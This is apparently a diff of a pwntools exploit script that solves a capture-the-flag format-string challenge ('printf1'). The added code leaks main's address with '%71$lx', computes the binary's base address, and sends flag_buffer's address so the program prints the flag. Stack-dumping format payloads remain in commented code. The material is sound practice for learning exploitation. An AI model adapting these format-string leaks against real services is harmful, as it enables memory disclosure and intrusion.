@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '../src/printf1')
+exe = context.binary = ELF('../src/printf1.debug')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -15,26 +15,13 @@ exe = context.binary = ELF(args.EXE or '../src/printf1')
 host = args.HOST or 'localhost'
 port = int(args.PORT or 14001)
 
-# Use the specified remote libc version unless explicitly told to use the
-# local system version with the `LOCAL_LIBC` argument.
-# ./exploit.py LOCAL LOCAL_LIBC
-if args.LOCAL_LIBC:
-    libc = exe.libc
-elif args.LOCAL:
-    library_path = libcdb.download_libraries('./libc.so.6')
-    if library_path:
-        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
-        libc = exe.libc
-    else:
-        libc = ELF('./libc.so.6')
-else:
-    libc = ELF('./libc.so.6')
-
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
+        print(exe)
+        print(exe.path)
         return process([exe.path] + argv, *a, **kw)
 
 def start_remote(argv=[], *a, **kw):
@@ -71,24 +58,57 @@ continue
 # Stripped:   No
 # Debuginfo:  Yes
 
-parts = []
-for i in range(1, 10):
-    io = start()
-    
-    # the return address of main is the 7th stack var
-    
-    io.recvuntil(b"something: ")
-    
-    payload = "|".join([f"%{j}$p" for j in range(i * 10, (i * 10) + 10)])
-    io.sendline(payload.encode('ascii'))
-    
-    io.recvuntil(b"said:")
-    part = io.recvuntil(b"I bet", drop=True).decode('ascii')
-    io.close()
+# calculating where the stack vars are
+#parts = []
+#for i in range(60, 100, 10):
+#    io = start()
+#    
+#    # the return address of main is the 7th stack var
+#    io.recvuntil(b"something: ")
+#    
+#    payload = "|".join([f"%{j + i}$p" for j in range(10)])
+#    io.sendline(payload.encode('ascii'))
+#    
+#    io.recvuntil(b"said:")
+#    part = io.recvuntil(b"I bet", drop=True).decode('ascii')
+#    io.close()
+#
+#    # formatting
+#    parts.append([i, list(map(lambda x: x.strip(), part.split("|")))])
+#
+## printing out the stack vars
+#for base, part in parts:
+#    for index, p in enumerate(part):
+#        print(f"{(base + index):03d}: {p}")
 
-    for p in part.split("|"):
-        parts.append(p)
+io = start()
 
-for index, part in enumerate(parts):
-    print(f"{index}: {part}")
+# main is @ stack var 71 (and 80 for whatever reason)
+io.info("Leaking base address of the binary.")
+io.recvuntil(b"something: ")
+
+payload = "%71$lx"
+io.sendline(payload.encode('ascii'))
+
+io.recvuntil(b"said:")
+main_addr = int(io.recvuntil(b"I bet", drop=True).decode('ascii'), 16)
+
+# logging
+exe.address = main_addr - exe.sym["main"]
+io.success(f"Leaked address of main: {hex(main_addr)}")
+io.success(f"Leaked base address of binary: {hex(exe.address)}")
+
+flag_buffer = exe.symbols["flag_buffer"]
+
+# entering in the address of flag_buffer
+io.info("Leaking flag.")
+
+io.recvuntil(b"from? ")
+io.sendline(f"{flag_buffer}".encode('ascii'))
+
+# flag obtained
+io.recvuntil(b"interesting: ")
+flag = io.recvall().decode('ascii')
+
+io.success(f"Flag: {flag}")
 
